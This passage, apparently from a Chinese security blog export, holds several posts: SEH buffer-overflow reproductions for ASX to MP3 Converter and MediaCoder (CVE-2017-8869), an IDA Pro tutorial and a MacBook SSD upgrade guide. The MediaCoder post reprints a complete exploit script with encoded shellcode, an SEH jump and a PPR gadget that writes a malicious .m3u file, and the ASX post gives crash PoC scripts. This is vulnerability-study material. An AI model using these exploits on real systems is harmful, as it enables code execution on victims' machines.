分析原因\n\n从崩溃地址00430402开始向上分析，追溯这一堆A的由来，首先断点依然在fopen处，虽然已经感觉问题不在这里，但还是看一下\n\n![image-20200418000156687](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx7jyy5uij30x00huta4.jpg)\n\n从地址428B46调用fopen，在428B72处调用freed读入文件的值，之后一直到fclose都没有任何异常数据，所以漏洞点并不在这部分代码中\n\n继续向下调试，发现在42B62B位置调用MSA2Mfil.Playlist_FindNextItem后就开始有异常数据，可以判断问题出在该函数内部，且在模块列表中发现该函数是在程序自带的Dll库中，是MSA2Mfilter03.dll\n\n![image-20200416181606697](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvrxtbi9zj311p0ln418.jpg)\n\n同时使用IDA查看MSA2Mfilter03.dll中的代码，在Functions中确实有Playlist_FindNextItem函数\n\n![image-20200416190947842](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvthnu1doj30ol0bcq3m.jpg)\n\n在OD中也进入该dll逐步调试，在10008D55位置第一次出异常数据，在IDA中对应发现在函数sub_10008D20中无论条件如何，最终都会输出该异常数据\n\n![image-20200418004152406](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx8pij89nj30ud0alaal.jpg)\n\n![image-20200418003654169](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx8kc3y6bj30fy0543yl.jpg)\n\n![image-20200418003726435](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx8kw95vsj30kg0jewf8.jpg)\n\n![image-20200418092057997](https://tva1.sinaimg.cn/large/007S8ZIlly1gdxnpmnnogj30lu0h874t.jpg)\n\n继续向下走，依旧是在该dll中，发现在地址1000D3C3处为溢出点，SEH就是在此处被覆盖掉的\n\n![image-20200418005703356](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx95aznbxj319q0of0we.jpg)\n\nida中查看REP MOVS循环，其实是使用函数strcpy完成循环复制，问题就出现在strcpy函数。\n\n![image-20200416222010065](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvyzqnak9j30hg0b074p.jpg)\n\n![image-20200418090251250](https://tva1.sinaimg.cn/large/007S8ZIlly1gdxn6s8thoj31a70ozadj.jpg)\n\n此时我们就可以简单计算一下从覆盖的起点（由图可知D159C）到最近一个SEH（由图可知DBFA4）有多远了，它们相减是43528，看来poc设置50000还是有考虑的，经过多次测算调试，poc中设置43483个A（前面一串路径占了部分位置），后面的八个字符即正好是SEH的位置，后面写利用脚本可以使用该位置。\n\n![image-20200416224706440](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvzrsqm24j30q40tkwux.jpg)\n\n![image-20200416224017391](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvzkoktpij30e805st8t.jpg)\n\n![image-20200416224157265](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvzmf0clgj30g8055aa5.jpg)\n\n看到这里有没有朋友发现奇怪的地方，在第二部分原博复现：我实际的操作第3步中分析了程序不像原博中一样执行到了最后而是在中间断开的原因，起端就是如下图这个位置堆栈DBFB4的非法数据mov进了ecx，最终导致内存读写错误，而DBFB4的非法数据从何而来我们从上图就可以一清二楚\n\n![image-20200417102251074](https://tva1.sinaimg.cn/large/007S8ZIlly1gdwjvt9oetj315w0ng77f.jpg)\n\n如果我们想要复现原博中的情况，让它执行到最后再跳转错误，只需要在构造poc时，中间多垫几层，在DBFB4位置输入一个合法地址就可以了，此时poc应该为\n\n```python\npoc = \"\\x41\" * 43483 SEH偏移\npoc += \"\\x42\\x42\\x42\\x42\"   ；覆盖Nseh\npoc += \"\\x41\\x41\\x41\\x41\"   ;覆盖SEH\npoc += \"\\x90\"*8\npoc += \"\\xCC\\xC7\\x10\\x00\"  ；防止过程中内存读写出错构造的跳转地址\n\n\n\nrst = open(\"exploit.m3u\",'w')\nrst.write(poc)\nrst.close();\n\n```\n\n构建地址后，成功继续向下走，分析过程就与原博基本相同了，但是在最后一步retn 4时，发现跳转为90909090也就是nop而不是A，仔细看堆栈，位置为DC5B8正好为防止内存出错构造地址的上一条\n\n![image-20200418095722792](https://tva1.sinaimg.cn/large/007S8ZIlly1gdxorir6p5j318m0d3gn5.jpg)\n\n则poc进一步改为\n\n```python\npoc = \"\\x41\" * 43483 SEH偏移\npoc += \"\\x42\\x42\\x42\\x42\"   ；覆盖Nseh\npoc += \"\\x41\\x41\\x41\\x41\"   ;覆盖SEH\npoc += \"\\x90\"*4\npoc += \"\\x41\\x41\\x41\\x41\"  ;原博程序末尾 retn 4 跳转的地址\npoc += \"\\xCC\\xC7\\x10\\x00\"  ；防止过程中内存读写出错构造的跳转地址\n\n\n\nrst = open(\"exploit.m3u\",'w')\nrst.write(poc)\nrst.close();\n\n```\n\n至此分析结束，进一步的利用exp可以在这个poc基础上改。\n\n### 总结\n\n综合看下来，该漏洞并不是由于fopen而产生的，具体产生原因应该是应用程序自带的MSA2Mfilter03.dll组件内Playlist_FindNextItem函数解析恶意.M3U文件时不正确的边界检查引起的，溢出点在1000D3C3地址处，REP MOVS循环，其实是使用函数strcpy完成循环复制，问题就出现在strcpy函数，精心构造的POC可导致SEH指针被覆盖，因此在函数结束时，程序返回到一个不可读的地址，从而触发了异常处理流程，关键节点的地址均可在poc中改变，程序可控。\n\n\n\n#### 参考文献\n\nASX TO MP3本地代码执行漏洞 https://whereisk0shl.top/post/2016-11-04\n\n[翻译]Windows漏洞利用开发 - 第3部分：偏移更改和重定位模块 https://bbs.pediy.com/thread-225831.htm\n\n漏洞分析——ASX to MP3 Converter本地代码执行漏洞 [https://ayesawyer.github.io/2019/07/08/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94ASX-to-MP3-Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/](https://ayesawyer.github.io/2019/07/08/漏洞分析——ASX-to-MP3-Converter本地代码执行漏洞/)\n\nWindows漏洞利用开发教程 Part 4：SEH https://www.freebuf.com/articles/system/170703.html","tags":["漏洞复现","漏洞分析"],"categories":["二进制"]},{"title":"IDA总结使用与简单实践","url":"/2021/01/25/IDA/","content":"\n###  IDA核心功能介绍\n\nIDA Pro（简称IDA）是DataRescue公司出品的一款可编程的交互式反汇编工具和调试器，它的最主要的特性是交互和多处理器。操作者可以通过对IDA的交互来指导IDA更好地反汇编，IDA并非自动解决程序中的问题，但它会按用户的指令找到可疑之处，用户的工作是通知IDA怎样去做。比如人工指定编译器类型，对变量名、结构定义、数组等定义等。这样的交互能力在反汇编大型软件时显得尤为重要。多处理器特点是指IDA支持常见处理器平台上的软件产品，IDA支持的文件类型非常丰富，除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台的文件格式。\n\n<!-- more -->\n\nIDA Pro首先是一个反汇编器，可以显示二进制汇编代码（可执行文件或DLL动态链接库），它提供的高级功能帮助我们更加容易的理解汇编代码。其次，它又是一个调试器，用户可以逐条调试二进制文件中的指令，从而确定当前正在执行的哪条指令，以及执行的顺序等。\n\nIDA Pro提供了许多强大功能，例如函数的交叉引用查看、函数执行流程图及伪代码等，并且也有一定的动态调试功能。同时，IDA pro可以在windows、linux、ios下进行二进制程序的动态调试和动态附加，支持查看程序运行内存空间，设置内存断点和硬件断点。\n\nIDA无疑是当今最强大的反汇编软件，虽然目前IDA支持简单的动态调试，但是大多数情况下我们主要使用其强大的反汇编功能。\n\n###  IDA加载自编译HelloWorld程序\n\n我们使用visual c++编写一个简单的helloworld，在编译、链接后形成一个二进制程序，程序如下所示：\n\n```c++\n#include <iostream.h>\nint main(){\n\tcout<<\"Hello,World!\"<<endl;\n\tcin.get();\n\treturn 0;\n}\n```\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753ldo622j31ex0oawif.jpg)\n\n将该程序放入IDA Pro中进行静态反汇编\n\n \n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753m24s3rj31100o042c.jpg) \n\n可以看到使用IDA反汇编程序时，IDA会自动停在main()函数入口处，下面的程序主体也都列了出来，Helloworld程序加载成功。\n\n###  IDA分析真实程序\n\n我们以windows中自带的扫雷为例，来对IDA pro进行简单的使用介绍。将桌面Winmine.exe文件拖入IDA后界面如下图所示：\n\n![](https://tva1.sinaimg.cn/large/006y8mN6ly1g753n6x4zbj316m0po7gy.jpg)\n\n我们看到在程序加载完全后整体页面分为几个大部分，对其标号后分别对其功能进行介绍。\n\n第一部分表示的是IDA概况导航栏，它是被加载文件地址空间的线性视图。如图中所示它对扫雷程序内不同代码块使用不同的颜色进行区分，我们可以直接点击相应的颜色块进行不同代码块的直接定位。默认情况下，我们定义颜色的意义为：\n\n蓝色：表示代码段。\n\n棕色：表示数据段。\n\n红色：表示内核。\n\n第二部分表示该扫雷程序的函数表，双击任一后反汇编窗口会跳转到选定函数的所在位置，进而查看详细信息，如图中选中了start开始函数。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753ovpysqj30l40d00ug.jpg) \n\n第三部分对应的就是整体扫雷程序结构的图形概况形式，可以大体把握功能和结构的走向，它对整体的脱壳逆向有很大的帮助。事实上这一部分是图形视图的一个缩小快照，因为主显示区很少能够一次显示某个函数的完整图形，下图中的虚线矩形就表示其在图形视图中的当前显示位置。在图形概况窗口内点击鼠标，可重新定位图形视图的显示位置。\n\n \n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753ozuhbbj30960aamxb.jpg) \n\n第四部分是IDA的主视图，常用的又可以分为以下几部分信息：\n\n（1）IDA View-A\n\nIDA View-A表示的就是该扫雷程序的图标架构，可以查看程序的逻辑树形图，把程序的结构更人性化地显示出来，方便我们的分析。它显示出一个函数内部的执行流程。在反汇编界面中按空格键就可以在汇编代码和图形显示之间进行切换。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753p3m9aoj30lx09rgq7.jpg) \n\n（2）Hex View-1\n\n在Hex View-1中可以查看扫雷的16进制代码，方便定位代码后使用其他工具进行进一步的修改操作。默认情况下，Hex View窗口会与IDA View窗口同步，即在一个窗口中滚动鼠标，另一个窗口中也会滚动到相应的位置，此外在IDA View中选中一个项目，Hex View中的对应字节也会突出。具体表示如下图所示：\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753p7fnh9j30zk0l0agc.jpg) \n\n（3）Structures\n\n在Stuuctures中可以查看到扫雷程序的结构体，它用于显示IDA决定在一个二进制文件中使用的任何复杂的数据结构的布局。\n\n（4）Enums\n\n在Enums中可以查看枚举信息\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753pcqi1fj30n209tdjs.jpg) \n\n（5）Imports\n\n在Imports中可以查看到输入函数，导入表即程序中调用到的外面的函数。\n\n（6）Exports\n\n在Exports中可以查看到输出函数。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753phmpfsj30n2067mz2.jpg) \n\n###  IDA分析结果导出\n\n当使用IDA分析软件时，事实上它会创建一个数据库，其组件分别保存在4个文件中，这些文件的名称与选定的可执行文件名称相同，拓展名分别为id0、id1、nam与til。\n\nid0：它是一个二叉树形式的数据库\n\nid1：程序字节标识，包含描述每个程序字节的标记\n\nnam：Named窗口中显示的给定程序位置有关的索引信息\n\ntil：用于存储给定数据库的本地类型定义的相关信息\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753pnray1j30qa040q40.jpg) \n\n当你关闭一次分析想要保存时，或者切换到另一个数据库，IDA都将会显示一个Save database对话框，在它之中有如下几个选项：\n\nDon’t pack database（不打包数据库），这个选项仅仅刷新对 4 个数据库组件文件所做的更改，在关闭桌面前并不创建 IDB 文件\n\nPack database（Store）［打包数据库（存储）］，选择该选项会将 4 个数据库组件文件存到一个 IDB 文件中，然后这 4 个数据库文件会被删除，Store 选项不使用压缩\n\nPack database（Deflate）［打包数据库（压缩）］，Deflate 选项等同于 Store 选项，其唯一的差别在于数据库组件文件被压缩到 IDB 归档文件中\n\nCollect garbage（收集垃圾），如果勾选该选项，IDA 会在关闭数据库之前，从数据库中删除任何没有用的内存页面，在选择这个选项的同时，选择Deflate选项可创建尽可能小的 IDB文件。通常，只有在磁盘空间不足时才选择这个选项\n\nDON’T SAVE the datebase（不保存数据库），选择这个选项时，IDA 会删除 4 个数据库组件文件，保留现有的未经修改的 IDB 文件。使用这个选项类似于在使用IDA 时应用了撤销或还原功能\n\n###  IDA插件使用\n\nIDA作为一款强大的静态反汇编工具，它的插件可以让其功能得到进一步加强。下面介绍几个常用的IDA Pro插件：\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753prxw5vj30k20gq763.jpg) \n\n1.　Hex-Rays 反编译插件\n\nHex-Rays 反编译插件可以将汇编代码反编译成伪C/C++代码，便于用户阅读，提高反汇编的效率。目前Hex-Rays反编译插件只能在32位平台上运行，可以反编译Intel x86、Intel x86_64，ARM32、ARM64处理器产生的汇编代码。Hex-Rays仅以二进制格式发布，安装时，只需将提供的插件文件复制到/plugins目录即可。\n使用时，反编译包含光标的函数，只需要通过View -> Open Subview -> Pseudocode(热键 F5)。若想反编译整个程序，使用File -> Produce File -> Create C File (热键 CTRL+F5)。\n\n2.　IDAPython\n\nIDAPython功能十分强大。目前在IDA Pro 5.4及以后版本都已经集成了。它在IDA中集成了Python解释器，使用这个插件还可以编写出能够实现IDC脚本语言所有功能的Python脚本。该插件的一个显著优势在于，它可以访问Python数据处理功能以及所有Python模块，此外它还具有IDA SDK的大部分功能，与使用IDC相比，使用它可以编写出来更强大的脚本。\n\n3.　idaemu\n\n在逆向工程二进制文件的过程中往往会需要手动追踪代码，以了解函数的行为。指令的模拟器会是一个十分有用的工具，它可以帮助你跟踪在执行一系列指令的过程中，注册表和CPU状态的变化情况。这个插件就是这样一个模拟器，可以在IDA Pro中模拟执行指令代码。目前支持的架构：X86(16, 32, 64bit)、ARM32、ARM64、MIPS。\n\n###  IDA 常用快捷键总结\n\n| **快捷键** | **功    能**                       |\n| ---------- | ---------------------------------- |\n| **;**      | 为当前指令添加全文交叉引用的注释   |\n| **n**      | 定义或修改名称，通常用来标注函数名 |\n| **G**      | 跳转到任意地方观察代码             |\n| **Esc**    | 返回到跳转前的位置                 |\n| **D**      | 分别按字节、字、双字的形式显示数据 |\n| **A**      | 按照ASCII形式显示数据              |\n| **F5**     | 一键反汇编                         |\n\n ","tags":["个人总结"],"categories":["二进制"]},{"title":"MBP839更换ssd过程记录","url":"/2021/01/25/macbook换硬盘/","content":"\n# Introduction\n\n我的笔记本购于2015刚上大学时，受限于手中米不够，只能选择丐版128g的MF839CH/A。四年持续的使用，除了容量逐渐捉襟见肘，速度并没有明显的下降且运行十分稳定，本次鸟枪换炮希望能再撑4年，主要原因有以下几点：\n\n- 穷，前几天与朋友的一次长途旅行花掉了口袋中艰难存下的米（主因最先提出）\n- 15款MBP更换案例教程网上极多，使用M.2转接卡的方案基本成熟\n- 仅从学习角度讲性能足够，我也没玩电脑游戏的需求\n\n<!-- more -->\n\n# 更换原理\n\n在 `macOS`  10.13 正式发布之后，支持原生 `NVME` 协议，因此更换上相应的固态硬盘成为可能。\n 目前所知 2015 款及之前的 MacBook Pro 中 128 GB 和 256 GB 版本的原装硬盘都不是NVME协议，而是比较常规的 SATA。这么一来更换它就有了原始的动机：`更换后速度能比原装更快！成本更低！`\n\n由于 Apple 自家产品的封闭性，市面上通用的 m.2 接口固态硬盘都需要连接转接头才能够在 MacBook 上使用。因此需要在淘宝上自行搜索 **“M.2 NGFF 转 MacBook”** 关键字来找到这个转接头。\n\n\n\n# 替换SSD的选择\n\n要注意一个点，替换后在MacBook pro 2015 上并不能跑满速这类高端硬盘，原因是15 年 13 款包括老一点的 13 年 Mac Pro，速度基本上是 PCIe 2.0 x4，即 5 GT/s ；在 15 年 15 寸上是 3.0 x4，也就是 8 GT/s。这是上限，但尽量还是选择好点的硬盘毕竟缓存大一点，主控也好一点不那么容易出现掉速的情况。\n\n通过对国内外各种论坛中相关案例的总结，出现频率比较高的几款总结如下：\n\n- 三星：960pro、960evo（唤醒可能有问题）、970pro、970evo<font color=red>***//这里需要提醒，我询问转接卡卖家小二，三星evo plus系列转接后与mac不兼容***</font> \n- 西数：SN720、SN750（部分反映温度较高）\n- 惠普：EX900（入门级NVMe）、920<font color=red>***//惠普的价格一直挺低，但似乎有“李鬼”的嫌疑，惠普中国与惠普硬盘之间的关系傻傻搞不清，反正我在HP官网是没有查到这几款硬盘的数据***</font> \n- 英特尔：660p、760p<font color=red>***//660p采用qlc闪存，写入寿命较短，在写入大文件时后期掉速现象比较严重；而760p采用tlc闪存，写入寿命相对较长，温度控制是最大优势，正常30度***</font> \n- 国产ssd：海康威视C2000等<font color=red>***//性价比高，但是试水的人不多，不知道后期的兼容性如何***</font> \n\n# 工具\n\n需要准备的工具如下：\n1. 一个安装mac系统的u盘（新的ssd是无法识别的，必须要用u盘引导安装）\n2. time machine备份当前系统用于恢复在新的ssd上\n3. 内六角T4和内五角P5的螺丝刀，我买的米家的wiha工具，89块\n4. 一块新的m.2接口的ssd，我选择的是intel 760p \n5. 一个m.2 nvme的转接器\n\n# 更换的具体过程\n\n## 备份\n\ntime machine是`macOS`自带的备份软件，在`launchpad`里面的`other`文件夹中可以找到，你需要一块移动硬盘，把当前系统的所有文件都写进去，需要注意的是移动硬盘会被格式化，如果你的移动硬盘里面有什么重要的文件，备份到其他地方。备份还是比较简单的，使用MacBook自带的时间机器直接备份到外置硬盘上即可；\n详情查看这里：[Apple ---- 使用“时间机器”备份您的 Mac](https://support.apple.com/zh-cn/HT201250)\n\n## 制作启动优盘\n\n我安装的是最新的`macOS Mojave`系统，在app store中搜索下载，下载完成后不要选择安装，此时你的`Applications`文件夹中会有一个`Install macOS Mojave.app`的文件，大小差不多6G出头，然后根据mac官方的[网页](https://support.apple.com/zh-cn/HT201372)在`terminal`输入命令就可以了。\n\n准备一个大于8G的U盘，制作U盘启动器，有两种方法，第一种是命令行解决，第二种是傻瓜软件，教程直接看链接：\n[制作 macOS Mojave U盘USB启动安装盘方法教程 (全新安装 Mac 系统)](https://www.iplaysoft.com/macos-usb-install-drive.html)\n\n主要使用命令为\n\n```\nsudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/Mojave /Applications/Install\\ macOS\\ Mojave.app --nointeraction\n```\n\n## 开始更换\n\n### 将准备好的东西放在一起\n\n清点一下东西，不要少了材料工具\n\n![5605774FA554D16BA3DF66D25330D0F8](http://ww2.sinaimg.cn/large/006y8mN6ly1g67dnvmctcj31sm0u0kjl.jpg)\n\n### 打开后盖、断开电源、安装\n\n可以参考iFitit的拆解教程：[https://zh.ifixit.com/Guide/MacBook+Pro+13+英寸配备+Retina+显示屏2015年早期版SSD更换/38520](https://zh.ifixit.com/Guide/MacBook+Pro+13+%E8%8B%B1%E5%AF%B8%E9%85%8D%E5%A4%87+Retina+%E6%98%BE%E7%A4%BA%E5%B1%8F2015%E5%B9%B4%E6%97%A9%E6%9C%9F%E7%89%88SSD%E6%9B%B4%E6%8D%A2/38520)\n\n![C1810F5FA658A13131BF55F9F3B2A4E1](http://ww3.sinaimg.cn/large/006y8mN6ly1g67dpempegj31sm0u0hdu.jpg)\n\n![A230D7D0994D4E09B1340C8C64A00841](http://ww3.sinaimg.cn/large/006y8mN6ly1g67dpmzdpfj30u01sme82.jpg)\n\n![86A2E2B603E766EAAC0A687D0D21BC90](http://ww2.sinaimg.cn/large/006y8mN6ly1g67e3jradrj30u01smkjm.jpg)\n\n![D67C2E0107897E1C79408A370D552133](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e3gbee4j30u01smu0x.jpg)\n\n1. 背板上一共10个螺丝，靠近显示器的一边4个，中间两个，最下面4个，其中靠近显示器那边的4个的中间两个是和其他螺丝不同的比较短的，安装的时候记得区分。\n2. 螺丝拆外以后从靠近显示器的那边揭开背板，是比较容易的，只要抓着靠着显示器那边的背板沿，稍稍用力就可以揭开（背板除了螺丝，就只有中间的两个卡扣固定，不是很紧，很容易揭开）\n3. 换ssd为了安全起见不要带电操作，把电源先断开，在ifixit的那个页面也有看到，第一次拔那个电源可能有点紧，可以先在一边用力，会比较好拔一点，力气要稍微大一点。\n4. 转接器的插入不是那么容易，要用点力，转接器和ssd一定要插好，不然螺丝不好上（固定ssd的就一个内五角螺丝）\n5. 安装完成以后记得把电源线插回去\n\n### 安装系统以及恢复\n\n由于新装的ssd系统是无法识别的，我们需要一个u盘安装器来引导安装并格式化新的ssd，插上u盘，启动电脑（第一次启动可能比较慢，不要着急）。系统会直接读取U盘开始安装，在安装系统之前，先进入磁盘工具格式化自己的新ssd。格式化的格式选择按apple官方的说法是`macOS 日志`和`afps`都可以，我原来的ssd是`afps`的，不过也有说要设置一下`GUID分区图`的，所以我的做法是先格式化了一边`macOS日志`，在格式化成`afps`格式。\n\n格式化好ssd以后此时ssd已经能被系统识别的，我们退出磁盘工具，选择安装macOS，安装的位置就选择我们的新ssd，安装过程很快我感觉没10分钟就安装好了。安装好系统以后就会进入到系统设置阶段（选择地区，键盘以及隐私政策），前面的直接下一步就行了，直到要你选择`是否要传输信息到这台mac`，接上你的备份硬盘，选择第一个从时间机器传输，然后选择最新的备份就可以了，恢复系统的时间比较长，我的系统文件就60多个G也恢复了一个小时，如果你的文件更多可能要更久。\n\n![FF2D262D0815359B756F0FE3D14C2201](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e3gptlij31sm0u01kx.jpg)\n\n![CE0783F9E75DB613BA2FDAA8DF940F97](http://ww3.sinaimg.cn/large/006y8mN6ly1g67e3ibtkpj31sm0u01kx.jpg)\n\n## 硬盘测试\n\n1. 原装的128G固态是SATA协议的，这个512G是NVME协议的性能更强；\n2. 链接宽度必须是x4的只要你的硬盘是支持pcie x4的就可以，如果不是，转接卡有问题，尽快更换；\n3. 链接速度13寸的是5.0的，15寸的是8.0的，如果不是，也是转接卡的问题；\n\n![image-20190815133916201](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e3j5i2yj315m0run2a.jpg)\n\n最后上一张跑速的图，基本正常（在测试数据设置中，要改为1Gb为准，默认5Gb在后面会掉速，是正常现象）\n\n![DiskSpeedTest](http://ww4.sinaimg.cn/large/006y8mN6ly1g67e3huvyej30kc0l0tc5.jpg)\n\n# 总结\n\n2015款是最后几代能自己换硬盘的macbook了，真的很难得，之后都是焊在主板上，再加上从上一代Macos还开放了对NVME的支持，摆了明让人换硬盘，有老款mac的小伙伴们赶快行动起来吧！","tags":["MacbookPro"],"categories":["其他"]},{"title":"MEDIACODER .M3U缓冲区溢出漏洞（CVE-2017-8869）","url":"/2021/01/25/MEDIACODER缓冲区漏洞/","content":"\n本文是针对Mediacoder缓冲区溢出漏洞的简要分析文章\n\n<!-- more -->\n\n### 背景概述\n\n本来是浏览学长博客 [MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞](https://whereisk0shl.top/post/2018-06-23) 进行的漏洞分析过程\n\n实验环境为：\n\nWindows xp sp3\n\nWindbg\n\nIDA pro\n\nOD\n\nMEDIACODER 软件下载：https://www.exploit-db.com/apps/bab45ceeba55cbe48a49ead4e6787fd0-MediaCoder-0.8.45.5852.exe\n\n### 分析过程\n\n原文提供的poc如下所示\n\n```python\n#!/usr/bin/python\n \ntotal_buf = 5000\n \n \nshellcode = (\"\\x89\\xe1\\xda\\xcc\\xd9\\x71\\xf4\\x5e\\x56\\x59\\x49\\x49\\x49\\x49\\x43\"\n\"\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\\x58\\x34\"\n\"\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\\x42\\x41\\x41\"\n\"\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x58\"\n\"\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4d\\x38\\x4c\\x42\\x55\\x50\"\n\"\\x45\\x50\\x35\\x50\\x53\\x50\\x4c\\x49\\x4b\\x55\\x46\\x51\\x59\\x50\\x55\"\n\"\\x34\\x4c\\x4b\\x30\\x50\\x56\\x50\\x4c\\x4b\\x31\\x42\\x54\\x4c\\x4c\\x4b\"\n\"\\x46\\x32\\x44\\x54\\x4c\\x4b\\x32\\x52\\x47\\x58\\x34\\x4f\\x58\\x37\\x50\"\n\"\\x4a\\x47\\x56\\x50\\x31\\x4b\\x4f\\x4e\\x4c\\x37\\x4c\\x43\\x51\\x53\\x4c\"\n\"\\x53\\x32\\x36\\x4c\\x51\\x30\\x59\\x51\\x58\\x4f\\x34\\x4d\\x35\\x51\\x48\"\n\"\\x47\\x4a\\x42\\x5a\\x52\\x36\\x32\\x46\\x37\\x4c\\x4b\\x56\\x32\\x52\\x30\"\n\"\\x4c\\x4b\\x50\\x4a\\x57\\x4c\\x4c\\x4b\\x50\\x4c\\x52\\x31\\x32\\x58\\x4d\"\n\"\\x33\\x30\\x48\\x33\\x31\\x38\\x51\\x46\\x31\\x4c\\x4b\\x50\\x59\\x31\\x30\"\n\"\\x33\\x31\\x49\\x43\\x4c\\x4b\\x30\\x49\\x55\\x48\\x5a\\x43\\x36\\x5a\\x47\"\n\"\\x39\\x4c\\x4b\\x30\\x34\\x4c\\x4b\\x45\\x51\\x39\\x46\\x36\\x51\\x4b\\x4f\"\n\"\\x4e\\x4c\\x59\\x51\\x48\\x4f\\x44\\x4d\\x53\\x31\\x58\\x47\\x56\\x58\\x4d\"\n\"\\x30\\x33\\x45\\x4b\\x46\\x54\\x43\\x43\\x4d\\x4c\\x38\\x47\\x4b\\x53\\x4d\"\n\"\\x37\\x54\\x54\\x35\\x5a\\x44\\x51\\x48\\x4c\\x4b\\x30\\x58\\x57\\x54\\x35\"\n\"\\x51\\x4e\\x33\\x55\\x36\\x4c\\x4b\\x54\\x4c\\x30\\x4b\\x4c\\x4b\\x56\\x38\"\n\"\\x45\\x4c\\x43\\x31\\x58\\x53\\x4c\\x4b\\x55\\x54\\x4c\\x4b\\x35\\x51\\x48\"\n\"\\x50\\x4b\\x39\\x51\\x54\\x56\\x44\\x46\\x44\\x51\\x4b\\x31\\x4b\\x43\\x51\"\n\"\\x46\\x39\\x30\\x5a\\x46\\x31\\x4b\\x4f\\x4d\\x30\\x51\\x4f\\x51\\x4f\\x31\"\n\"\\x4a\\x4c\\x4b\\x52\\x32\\x4a\\x4b\\x4c\\x4d\\x51\\x4d\\x52\\x4a\\x43\\x31\"\n\"\\x4c\\x4d\\x4c\\x45\\x4f\\x42\\x43\\x30\\x55\\x50\\x33\\x30\\x30\\x50\\x33\"\n\"\\x58\\x56\\x51\\x4c\\x4b\\x32\\x4f\\x4d\\x57\\x4b\\x4f\\x48\\x55\\x4f\\x4b\"\n\"\\x4a\\x50\\x38\\x35\\x4e\\x42\\x31\\x46\\x53\\x58\\x49\\x36\\x5a\\x35\\x4f\"\n\"\\x4d\\x4d\\x4d\\x4b\\x4f\\x4e\\x35\\x47\\x4c\\x43\\x36\\x33\\x4c\\x35\\x5a\"\n\"\\x4b\\x30\\x4b\\x4b\\x4d\\x30\\x44\\x35\\x33\\x35\\x4f\\x4b\\x31\\x57\\x44\"\n\"\\x53\\x52\\x52\\x52\\x4f\\x33\\x5a\\x33\\x30\\x36\\x33\\x4b\\x4f\\x58\\x55\"\n\"\\x42\\x43\\x45\\x31\\x52\\x4c\\x35\\x33\\x56\\x4e\\x55\\x35\\x54\\x38\\x32\"\n\"\\x45\\x53\\x30\\x41\\x41\")\n \njunk = \"http:// \"\njunk += \"A\"*784\nnseh = \"\\xEB\\x06\\x90\\x90\"\nseh = \"\\x38\\x78\\x01\\x66\" # PPR - 0x66017838 - libiconv-2.dll\nevil = junk + nseh + seh\nevil += \"\\x90\"*50 + shellcode\nevil += \"\\x90\"*3000\n \nfile = open(\"evil.m3u\", \"wb\")\nfile.write (evil)\nfile.close()\n```\n\n双击后生成一个m3u文件，用`MediaCoder`打开，触发崩溃。\n\n使用Windbg附加程序，发现拖入文件后断在了004306b5位置\n\n![image-20200430152618774](https://tva1.sinaimg.cn/large/007S8ZIlly1gebtphub73j30l008sgm9.jpg)\n\n再次执行出现414141，看来到了被覆盖的跳转位置，这个poc里位置需要再调一下\n\n![image-20200430153247696](https://tva1.sinaimg.cn/large/007S8ZIlly1gebtw6ngtzj30o406tjs6.jpg)\n\n参考教程中通过windbg的kb命令，回溯栈信息，还能看到入手点的上层调用函数，如下图。\n\n![image-20200430153625478](https://tva1.sinaimg.cn/large/007S8ZIlly1gebtzynq5zj30kz07mmy0.jpg)\n\n但是我在分析时，kb命令获取的信息却不太一样，应该是利用脚本需要根据利用环境进行调整的原因。\n\n![image-20200430153711431](https://tva1.sinaimg.cn/large/007S8ZIlly1gebu0rlqgkj30k208rq3d.jpg)\n\n看来没办法像原博一样，还是从第一次报错的004306b5位置开始查找原因吧\n\n放在IDA里看一下这一部分，好像是一个死循环啊\n\n```assembly\n.text:004306B0 loc_4306B0:                             ; CODE XREF: sub_430620+9B\u0019j\n.text:004306B0                 mov     al, [ecx]\n.text:004306B2                 lea     ecx, [ecx+1]\n.text:004306B5                 mov     [edx+ecx-1], al\n.text:004306B9                 test    al, al\n.text:004306BB                 jnz     short loc_4306B0\n```\n\n![image-20200430180002430](https://tva1.sinaimg.cn/large/007S8ZIlly1geby5e9w3wj30at0ehaai.jpg)\n\n我们可以看出来这一部分函数a3作为畸形字符串传入，在里面将a3交给v5，随后v5在do 